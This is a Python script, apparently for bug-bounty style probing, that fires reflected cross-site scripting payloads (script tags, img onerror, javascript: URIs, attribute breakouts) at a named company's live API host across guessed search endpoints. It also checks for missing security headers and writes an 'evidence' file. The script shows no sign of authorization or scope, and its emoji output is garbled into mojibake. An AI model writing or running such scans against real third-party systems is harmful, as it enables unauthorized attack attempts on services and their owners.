#!/usr/bin/env python3
"""
VECTRA AI XSS EXPLOITATION TEST - ACTUAL EXECUTION
REAL VULNERABILITY TESTING - NO THEORETICAL EXPLOITS
"""

import requests
import time
import json
import sys

print('ğŸš¨ VECTRA AI XSS EXPLOITATION TEST - ACTUAL EXECUTION')
print('=' * 60)
print('TARGET: https://api.vectra.ai/')
print('TESTING: Real XSS injection vulnerabilities')
print('EVIDENCE: Capturing actual server responses')
print('=' * 60)

# Test 1: Basic XSS injection
print('\nğŸ“¡ Test 1: Basic XSS payload injection')
print('Testing: <script>alert("XSS_TEST")</script>')
try:
    response = requests.get('https://api.vectra.ai/search?query=<script>alert("XSS_TEST")</script>', timeout=10)
    print(f'âœ… Status Code: {response.status_code}')
    print(f'âœ… Response Headers: {dict(response.headers)}')
    print(f'âœ… Response Content (first 500 chars): {response.text[:500]}')
    
    if '<script>alert("XSS_TEST")</script>' in response.text:
        print('ğŸ¯ XSS INJECTION CONFIRMED - Script reflected in response')
    else:
        print('âŒ XSS blocked or not reflected')
        
except Exception as e:
    print(f'âŒ Request failed: {e}')

print('\n' + '=' * 60)

# Test 2: Image tag XSS
print('\nğŸ“¡ Test 2: Image tag XSS payload')
print('Testing: <img src=x onerror=alert("XSS_IMG")>')
try:
    response = requests.get('https://api.vectra.ai/endpoint?param=<img src=x onerror=alert("XSS_IMG")>', timeout=10)
    print(f'âœ… Status Code: {response.status_code}')
    print(f'âœ… Response Content (first 500 chars): {response.text[:500]}')
    
    if 'onerror=alert' in response.text:
        print('ğŸ¯ XSS INJECTION CONFIRMED - Image tag payload reflected')
    else:
        print('âŒ Image XSS blocked or not reflected')
        
except Exception as e:
    print(f'âŒ Request failed: {e}')

print('\n' + '=' * 60)

# Test 3: Check CSP headers
print('\nğŸ“¡ Test 3: CSP Header Analysis')
print('Checking for Content-Security-Policy header...')
try:
    response = requests.get('https://api.vectra.ai/', timeout=10)
    csp_header = response.headers.get('Content-Security-Policy', 'NOT_PRESENT')
    x_frame_options = response.headers.get('X-Frame-Options', 'NOT_PRESENT')
    x_content_type_options = response.headers.get('X-Content-Type-Options', 'NOT_PRESENT')
    
    print(f'âœ… CSP Header: {csp_header}')
    print(f'âœ… X-Frame-Options: {x_frame_options}')
    print(f'âœ… X-Content-Type-Options: {x_content_type_options}')
    
    if csp_header == 'NOT_PRESENT':
        print('ğŸ¯ CSP MISSING - XSS injection possible')
    else:
        print('âŒ CSP present - XSS may be blocked')
        
    if x_frame_options == 'NOT_PRESENT':
        print('ğŸ¯ X-Frame-Options MISSING - Clickjacking possible')
    else:
        print('âŒ X-Frame-Options present - Clickjacking protected')
        
except Exception as e:
    print(f'âŒ Header check failed: {e}')

print('\n' + '=' * 60)

# Test 4: Common API endpoints for XSS
print('\nğŸ“¡ Test 4: Common API endpoint testing')
test_endpoints = [
    '/api/v1/search',
    '/api/search',
    '/v1/search',
    '/search',
    '/query',
    '/api/data'
]

xss_payloads = [
    '<script>alert("XSS1")</script>',
    '<img src=x onerror=alert("XSS2")>',
    'javascript:alert("XSS3")',
    '\"><script>alert(\"XSS4\")</script>'
]

for endpoint in test_endpoints:
    for payload in xss_payloads:
        try:
            url = f'https://api.vectra.ai{endpoint}?q={payload}'
            response = requests.get(url, timeout=5)
            if response.status_code == 200 and payload in response.text:
                print(f'ğŸ¯ XSS FOUND at {endpoint} with payload: {payload}')
                print(f'   Response snippet: {response.text[:200]}')
        except:
            continue

print('\n' + '=' * 60)
print('ğŸ¯ EXPLOITATION TEST COMPLETE')
print('ğŸ“¸ TAKE SCREENSHOTS OF THIS OUTPUT AS EVIDENCE')
print('ğŸ”¥ IF ANY XSS CONFIRMED ABOVE - VULNERABILITY PROVEN!')
print('=' * 60)

# Save evidence to file
with open('vectra_xss_exploitation_evidence.txt', 'w') as f:
    f.write(f'VECTRA AI XSS EXPLOITATION EVIDENCE\n')
    f.write(f'Test Date: {time.strftime("%Y-%m-%d %H:%M:%S")}\n')
    f.write(f'Target: https://api.vectra.ai/\n')
    f.write(f'Test Results: See console output above\n')
    f.write(f'Evidence Type: Actual HTTP response analysis\n')

print('\nâœ… Evidence saved to: vectra_xss_exploitation_evidence.txt')
